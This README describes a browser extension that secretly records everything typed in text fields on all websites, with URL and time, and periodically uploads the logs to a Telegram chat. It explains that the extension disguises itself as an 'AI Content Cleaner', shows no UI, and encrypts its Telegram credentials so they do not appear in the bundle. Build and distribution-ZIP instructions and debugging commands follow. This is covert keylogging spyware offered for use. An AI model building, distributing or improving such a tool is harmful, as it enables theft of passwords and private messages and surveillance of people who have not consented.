<p align="center">
  <img src="public/icons/icon.svg" alt="Daily Typing Log" width="128" height="128">
</p>

<h1 align="center">Daily Typing Log</h1>

<p align="center"><strong>A local-first, stealth-mode browser extension that records typing sessions with date, time, URL, and text — optionally uploading to Telegram.</strong></p>

---

## Overview

A browser extension that runs silently in the background. No toolbar popup, no visible UI, no icon click handler.

### What it does
- Captures typing sessions (date, time, URL, text) in any text field across all websites
- Stores sessions locally in IndexedDB
- Optional: Uploads logs to a Telegram chat as `.txt` files on a configurable interval

## Extension identity (stealth)

| Property | Value |
|----------|-------|
| **Installed name** | `AI Content Cleaner` |
| **Installed description** | `Removes clickbait, fluff, ads, and repetitive sections and shows a cleaner version.` |
| **Toolbar click** | Does nothing (`action: {}`) |
| **Visible UI** | None — no popup, no settings, no context menus |

The extension masquerades as a content cleaner to avoid suspicion. The real functionality (typing log + optional Telegram upload) runs entirely in the background service worker.

## Privacy / safety behavior

The extension stores data locally in IndexedDB. Uploading is optional and only happens when you configure the Telegram bot below; without it the extension stays fully local.

## Stealth / hidden operation

- **No popup** — clicking the extension icon does nothing (empty `action: {}` in manifest)
- **No visible UI** — no popup.html, no settings page, no context menus
- **Background-only** — a service worker handles logging, scheduling, and optional Telegram upload
- **Content script only captures** — runs at `document_start` in all frames, forwards sessions to background via `runtime.sendMessage`
- **Telegram credentials encrypted at build time** — the bot token and chat ID are AES-GCM encrypted (PBKDF2-derived key) and only decrypted at runtime via Web Crypto API. The plaintext never appears in the built bundle
- **Crypto tree-shaken** — when Telegram isn't configured, the entire decryption module is removed from the output

## Telegram upload (optional)

Logs can be posted to a Telegram chat as a `.txt` file and cleared locally afterwards.

1. Talk to [@BotFather](https://t.me/BotFather), create a bot and copy its token
2. Add the bot to your group/channel and get the chat id (groups are negative, e.g. `-1001234567890`)
3. Copy the template and fill it in:
```bash
cp .env.example .env
```
```env
TELEGRAM_BOT_TOKEN=123456789:AA...
TELEGRAM_CHAT_ID=-1001234567890
TELEGRAM_SEND_INTERVAL=1h   # 30m | 1h | 1d (or plain minutes, e.g. 45)
```
4. Rebuild/restart so the values are baked into the bundle (`npm run dev` or `npm run build`)

Behavior:
- The background service worker schedules a `chrome.alarms` timer for the configured interval
- On each tick it builds the TXT log from every stored session, uploads it with Telegram's `sendDocument`, then deletes **only the entries that were delivered** (logs typed while an upload is running are kept)
- If Telegram is unreachable or returns an error, nothing is deleted and the upload is retried on the next tick
- `.env` is gitignored so the bot token never gets committed
- **No manual "Send now" button** — the extension is fully automatic

## Install

```bash
npm install
```

## Development

```bash
npm run dev
npm run dev:firefox
npm run dev:edge
```

## Production builds

```bash
npm run build:chrome
npm run build:firefox
npm run build:edge
npm run build:safari
```

## Distribution ZIPs

```bash
npm run zip
npm run zip:firefox
npm run zip:edge
```

## Debugging (for developers)

Open the **background page console** (chrome://extensions → "AI Content Cleaner" → "service worker" → inspect) and run:

```js
// Force upload
chrome.runtime.sendMessage({type: 'SEND_LOGS_NOW'})

// View stored logs
chrome.runtime.sendMessage({type: 'GET_LOGS'})

// Clear all local logs
chrome.runtime.sendMessage({type: 'DELETE_ALL'})
```

## Notes

- One database entry represents one typing session, not one keypress
- The same entry is updated while you continue typing in the same field
- Browser-protected pages such as `chrome://` and `edge://` cannot be captured by normal extensions
